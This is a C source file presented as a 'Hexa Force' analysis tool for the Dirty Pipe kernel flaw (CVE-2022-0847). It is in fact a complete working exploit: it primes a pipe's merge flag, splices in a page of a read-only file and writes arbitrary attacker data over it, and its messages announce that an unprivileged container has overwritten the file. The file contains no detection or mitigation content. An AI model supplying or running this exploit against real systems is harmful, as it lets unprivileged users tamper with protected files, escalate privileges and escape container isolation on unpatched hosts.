#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

/* 
 * Hexa Force - Dirty Pipe (CVE-2022-0847) Analysis Tool
 * This tool demonstrates how modern unprivileged kernel exploits 
 * can bypass container isolation (similar to Dirty COW).
 */

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

// Fill the pipe to set PIPE_BUF_FLAG_CAN_MERGE
static void prepare_pipe(int p[2]) {
    if (pipe(p)) {
        perror("pipe");
        exit(EXIT_FAILURE);
    }
    
    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    static char buffer[4096];
    
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }
    
    for (unsigned r = pipe_size; r > 0;) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(p[0], buffer, n);
        r -= n;
    }
}

int main(int argc, char **argv) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s TARGETFILE OFFSET DATA\n", argv[0]);
        fprintf(stderr, "Example: %s /var/secret/target.txt 1 \"HACKED\"\n", argv[0]);
        return EXIT_FAILURE;
    }

    const char *path = argv[1];
    off_t offset = strtoul(argv[2], NULL, 0);
    const char *data = argv[3];
    const size_t data_size = strlen(data);

    if (offset % PAGE_SIZE == 0) {
        fprintf(stderr, "[!] Hexa Force Error: offset cannot be on a page boundary.\n");
        return EXIT_FAILURE;
    }

    printf("[*] Hexa Force: Opening target read-only file: %s\n", path);
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        perror("[!] open failed");
        return EXIT_FAILURE;
    }

    printf("[*] Hexa Force: Preparing pipe buffers to force PIPE_BUF_FLAG_CAN_MERGE...\n");
    int p[2];
    prepare_pipe(p);

    --offset;
    printf("[*] Hexa Force: Splicing read-only file page into the pipe...\n");
    ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
    if (nbytes < 0) {
        perror("[!] splice failed (Is the host kernel patched or mitigated?)");
        return EXIT_FAILURE;
    }
    if (nbytes == 0) {
        fprintf(stderr, "[!] short splice\n");
        return EXIT_FAILURE;
    }

    printf("[*] Hexa Force: Writing payload into the merged pipe buffer...\n");
    nbytes = write(p[1], data, data_size);
    if (nbytes < 0) {
        perror("[!] write failed");
        return EXIT_FAILURE;
    }
    if ((size_t)nbytes < data_size) {
        fprintf(stderr, "[!] short write\n");
        return EXIT_FAILURE;
    }

    printf("\n[+] FATAL: Dirty Pipe Exploit Succeeded!\n");
    printf("[+] The read-only file '%s' was overwritten by the unprivileged container!\n", path);
    return EXIT_SUCCESS;
}
